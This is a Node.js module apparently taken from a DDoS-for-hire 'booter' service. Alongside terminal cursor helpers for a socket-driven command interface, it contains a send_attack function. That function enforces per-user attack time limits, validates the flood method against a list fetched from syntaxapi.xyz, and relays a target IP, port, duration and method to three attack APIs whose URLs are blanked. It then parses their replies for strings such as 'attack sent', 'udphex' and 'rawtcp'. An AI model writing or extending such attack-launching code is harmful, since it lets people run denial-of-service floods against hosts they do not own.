// Modules
const fs = require("fs");
const fetch = require("node-fetch");

// Files
const Crud = require("../Auth/crud.js");

/*
*@params: Milliseconds
*@type: 
*/
exports.sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

exports.ChangeTitle = function() {

}


exports.set_cursor = function(row, column, socket) {
    socket.write("\033[" + row + ";" + column + "f");
}

exports.MoveCursorToLeft = function(count, socket) {
    socket.write("\033[" + count + "D")
}

exports.MoveCursorUp = function(count, socket) {
    socket.write("\033[" + count + "A");
}

exports.MoveCursorDown = function(count, socket) { 
    socket.write("\033[" + count + "B");
}

exports.methodValidation = async function(meth) { 
    let methods = await(await fetch("https://syntaxapi.xyz/methods.txt")).text();
    return (methods.includes(meth) ? true : false);
}

exports.send_attack = async function(ip, port, time, method, usr) {
    let get_user = await Crud.GetUser(usr, "str");
    let max_time = get_user.split(",")[4];

    if(parseInt(time) > parseInt(max_time)) return "[x] Error, You've reached your max time!\r\n";
    if(await this.methodValidation(method) == false) return "[x] Error, Invalid method!\r\n";

    // this.log_action(usr, ip, port, time, method);
    let response = "";
    
    let rreturn = await(await fetch("" + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn);
    response += "API 1: " + await this.get_api_response(rreturn) + "\r\n";

    let rreturn1 = await(await fetch("" + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn1);
    response += "API 2: " + await this.get_api_response(rreturn1) + "\r\n";

    let rreturn2 = await(await fetch("" + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn2);
    response += "API 3: " + await this.get_api_response(rreturn2) + "\r\n";
    return response;
}

exports.get_api_response = function(rpn) {
    let new_res = rpn.toLowerCase();
    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized") || new_res.includes('"status":"success"') || new_res.includes("attack started") || new_res.includes("powered by overowered")) {
        return "Attack Sent";
    } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
        return "Error, Invalid Key";
    } else if(new_res.includes("invalid method") || new_res.includes("method is invalid") || new_res.includes("method does not exist") || new_res.includes("method doesn't exist")) {
        return "Error, Invalid Method";
    } else {
        return "Error, Something went wrong catching attack response but this doesn't mean the attack didn't go through!";
    }
}
